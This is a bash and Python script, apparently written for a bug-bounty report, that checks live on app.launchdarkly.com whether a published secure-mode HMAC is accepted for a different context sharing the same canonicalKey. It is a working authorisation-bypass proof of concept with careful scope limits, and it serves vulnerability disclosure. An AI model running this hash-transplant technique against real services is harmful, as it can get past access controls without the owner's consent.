#!/usr/bin/env bash
# Live verification of the canonicalKey collision (F-002) — NO ACCOUNT NEEDED.
#
# IDEA
#   /internal/config/anonymous (unauthenticated) publishes, for LaunchDarkly's OWN dogfooding
#   environment: a client-side ID, the multi-context it signs, and `secureModeContextHash`
#   (= HMAC-SHA256(envSdkKey, canonicalKey(context))). canonicalKey is not injective: a
#   single-kind `user` context returns its key RAW while every other kind percent-escapes ':'
#   (see tools/poc-canonicalkey-collision.js + the Go/JS sources). Therefore the context
#       {"kind":"user","key":"<canonicalKey of the published multi-context>"}
#   has the SAME canonicalKey, so the published hash must also validate for it — a different
#   context than the one that was signed.
#
# WHY THIS IS SAFE / IN SCOPE
#   * Host: app.launchdarkly.com (in scope). Route: /sdk/evalx/{clientSideId}/contexts/{b64}
#     — the documented SDK polling fallback, which CI already confirmed exists on this host.
#   * Credential: the client-side ID that LD itself publishes to every anonymous visitor and
#     documents as "safe to embed in untrusted contexts". No customer credential is used.
#   * Data: LaunchDarkly's own dogfooding environment (their app's flags) — not another
#     customer's tenant. No account of ours or anyone else's is touched.
#   * Volume: <= 9 GET requests total, read-only, no writes, no rate-limit testing.
#   * Output hygiene: flag payloads are NOT committed. We record status code, byte length and a
#     160-char excerpt only, so LD's internal flag values are not copied into this repo.
#
# INTERPRETATION TABLE (written into the results file)
#   no-h request 200            -> secure mode is OFF for that env  => INCONCLUSIVE (say so)
#   no-h 4xx AND control 4xx AND collision 200
#                               -> secure mode enforced, hash TRANSPLANTED to a different
#                                  context shape => collision confirmed server-side
#   no-h 4xx AND control 4xx AND collision 4xx
#                               -> server distinguishes the shapes => not vulnerable
set -uo pipefail

LD='https://app.launchdarkly.com'
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36'
OUT="${CI_RESULTS_DIR:-ci-results/local}"
mkdir -p "$OUT/raw3"
RES="$OUT/securemode-collision.txt"
: > "$RES"

echo "=== F-002 live check: canonicalKey collision vs secure-mode hash ===" | tee -a "$RES"

# 1. one unauthenticated fetch of the published dogfood config
curl -sS --compressed --max-time 30 -A "$UA" "$LD/internal/config/anonymous" \
  -o "$OUT/raw3/dogfood-config.json" 2>/dev/null || true
if [ ! -s "$OUT/raw3/dogfood-config.json" ]; then
  echo "  could not fetch /internal/config/anonymous — aborting" | tee -a "$RES"; exit 0
fi

# 2. derive the test contexts locally (spec-exact canonicalKey, per Go/JS sources)
python3 - "$OUT/raw3/dogfood-config.json" "$OUT/raw3" "$LD" <<'PY' 2>&1 | tee -a "$RES"
import base64, json, sys
cfg = json.load(open(sys.argv[1], errors='ignore'))
outdir = sys.argv[2]
LD = sys.argv[3]          # the shell variable is not visible inside a quoted heredoc
csid = cfg.get('clientSideId')
ctx  = cfg.get('dogfoodContext')
h    = cfg.get('secureModeContextHash')
print(f"  clientSideId          : {csid}")
print(f"  secureModeContextHash : {h}")
print(f"  signed dogfoodContext : {json.dumps(ctx, separators=(',',':'))[:300]}")

def encode_key(k):                      # ':' -> %3A, '%' -> %25  (NOT applied to kind 'user')
    return k.replace('%', '%25').replace(':', '%3A') if ('%' in k or ':' in k) else k

def canonical_key(c):
    if c.get('kind') == 'multi':
        kinds = sorted(k for k in c if k != 'kind')
        return ':'.join(f"{k}:{encode_key(c[k]['key'])}" for k in kinds)
    if c.get('kind', 'user') == 'user':
        return c['key']                 # <-- RAW: the asymmetry this PoC exploits
    return f"{c['kind']}:{encode_key(c['key'])}"

def b64url(o):
    return base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).decode().rstrip('=')

ck = canonical_key(ctx)
print(f"  canonicalKey(signed)  : {ck}")

colliding = {"kind": "user", "key": ck}          # different context, same canonicalKey
print(f"  canonicalKey(colliding single-kind user context): {canonical_key(colliding)}")
print(f"  COLLISION (local)     : {canonical_key(colliding) == ck}")

control = {"kind": "user", "key": "bugcrowd-control-not-signed-0001"}   # must NOT be authorised
attr_changed = json.loads(json.dumps(ctx))                              # same canonicalKey,
if isinstance(attr_changed.get('user'), dict):                          # different attributes
    attr_changed['user']['dogfoodCanary'] = True

cases = {
  'orig':        ctx,
  'collision':   colliding,
  'control':     control,
  'attrchanged': attr_changed,
}
out = {'clientSideId': csid, 'hash': h, 'canonicalKey': ck,
       'urls': {}}
for name, c in cases.items():
    out['urls'][name] = f"{LD}/sdk/evalx/{csid}/contexts/{b64url(c)}"
    json.dump(c, open(f"{outdir}/ctx-{name}.json", 'w'), separators=(',', ':'))
json.dump(out, open(f"{outdir}/plan.json", 'w'), indent=1)
print(f"  test contexts written : {', '.join(cases)}")
PY

PLAN="$OUT/raw3/plan.json"
[ -s "$PLAN" ] || { echo "  no plan produced (python step failed; see traceback above) — aborting" | tee -a "$RES"; exit 0; }
HASH=$(python3 -c "import json;print(json.load(open('$PLAN'))['hash'] or '')")

req() { # req <label> <url> [extra args]
  local label="$1" url="$2"; shift 2
  local tag; tag=$(echo "$label" | tr -c 'a-zA-Z0-9._-' '_')
  local code size body
  code=$(curl -sS -D "$OUT/raw3/$tag.hdr" -o "$OUT/raw3/$tag.body" -w '%{http_code}' \
         --max-time 20 -A "$UA" "$@" "$url" 2>/dev/null || echo ERR)
  size=$(wc -c < "$OUT/raw3/$tag.body" 2>/dev/null | tr -d ' ')
  body=$(head -c 160 "$OUT/raw3/$tag.body" 2>/dev/null | tr -d '\r' | tr '\n' ' ')
  LASTCODE="$code"
  printf '%-28s %-4s %8sB  %s\n' "$label" "$code" "$size" "$body" | tee -a "$RES"
  # do NOT keep full payloads: truncate the stored body so LD's flag values aren't committed
  head -c 400 "$OUT/raw3/$tag.body" > "$OUT/raw3/$tag.body.trunc" 2>/dev/null && mv "$OUT/raw3/$tag.body.trunc" "$OUT/raw3/$tag.body"
  sleep 0.4
}

echo | tee -a "$RES"
echo "--- requests (client-side eval route on the in-scope app host) ---" | tee -a "$RES"
U_ORIG=$(python3 -c "import json;print(json.load(open('$PLAN'))['urls']['orig'])")
U_COLL=$(python3 -c "import json;print(json.load(open('$PLAN'))['urls']['collision'])")
U_CTRL=$(python3 -c "import json;print(json.load(open('$PLAN'))['urls']['control'])")
U_ATTR=$(python3 -c "import json;print(json.load(open('$PLAN'))['urls']['attrchanged'])")

# BASELINE FIRST: if the signed context with its own valid hash is not accepted by this route, the
# experiment cannot conclude anything, so stop after two requests instead of firing all eight.
req "orig (with h) BASELINE" "$U_ORIG?h=$HASH"
BASELINE="$LASTCODE"
if [ "$BASELINE" != "200" ]; then
  req "orig (NO h)" "$U_ORIG"   # one extra request, to characterise the route's behaviour
  echo | tee -a "$RES"
  echo "  BASELINE FAILED ($BASELINE) — the published dogfood client-side ID is not served by" | tee -a "$RES"
  echo "  app.launchdarkly.com/sdk/evalx/. A 401 with a 0-byte body is the same response this route" | tee -a "$RES"
  echo "  gives for a client-side ID it does not know (see ci-results/run-2 route matrix), and the" | tee -a "$RES"
  echo "  dogfood config points its own SDK at relay-fdv2-prod.ld.catamorphic.com, which is" | tee -a "$RES"
  echo "  OUT OF SCOPE and is not contacted by this script." | tee -a "$RES"
  echo "  ==> INCONCLUSIVE. No claim is made about server-side secure-mode validation either way." | tee -a "$RES"
  echo "      The definitive test runs on OUR OWN environment: tools/ci-authenticated-phase.sh §H" | tee -a "$RES"
  echo "      (reads our own clientSideId + SDK key with our own token, computes both HMACs locally," | tee -a "$RES"
  echo "      probes the colliding context). Requires the LD_TOKEN secret." | tee -a "$RES"
  echo "done -> $RES" | tee -a "$RES"
  exit 0
fi
req "collision (with h)"  "$U_COLL?h=$HASH"
req "control (with h)"    "$U_CTRL?h=$HASH"
req "attrchanged (with h)" "$U_ATTR?h=$HASH"
# secure-mode enforcement controls
req "orig (NO h)"         "$U_ORIG"
req "collision (NO h)"    "$U_COLL"
req "collision (bad h)"   "$U_COLL?h=0000000000000000000000000000000000000000000000000000000000000000"
req "collision (h+reasons)" "$U_COLL?h=$HASH&withReasons=true"

echo | tee -a "$RES"
echo "--- interpretation ---" | tee -a "$RES"
python3 - "$RES" <<'PY' | tee -a "$RES"
import re, sys
txt = open(sys.argv[1], errors='ignore').read()
def code(label):
    m = re.search(re.escape(label) + r'\s+(\d{3}|ERR)', txt)
    return m.group(1) if m else '?'
no_h, coll, ctrl, orig = code('orig (NO h)'), code('collision (with h)'), code('control (with h)'), code('orig (with h)')
print(f"  orig with h        = {orig}")
print(f"  orig WITHOUT h     = {no_h}   (4xx => secure mode is enforced for this env)")
print(f"  control with h     = {ctrl}   (4xx => the hash is not accepted for an unrelated context)")
print(f"  collision with h   = {coll}")
if no_h.startswith('4') and ctrl.startswith('4') and coll.startswith('2'):
    print("  ==> VULNERABLE: secure mode is enforced, the hash was rejected for an unrelated")
    print("      context, yet ACCEPTED for a different context that shares its canonicalKey.")
    print("      The signed context and the evaluated context are not the same context.")
elif no_h.startswith('2'):
    print("  ==> INCONCLUSIVE: this environment does not enforce secure mode (no-h succeeded),")
    print("      so acceptance of the collision case proves nothing about hash validation.")
    print("      Re-run against an environment with secure mode ON (needs our own env).")
elif coll.startswith('4'):
    print("  ==> NOT VULNERABLE server-side: the service distinguished the two context shapes")
    print("      even though the SDKs compute identical canonicalKeys for them.")
else:
    print("  ==> MIXED / needs manual review of the codes above.")
PY
echo "done -> $RES" | tee -a "$RES"
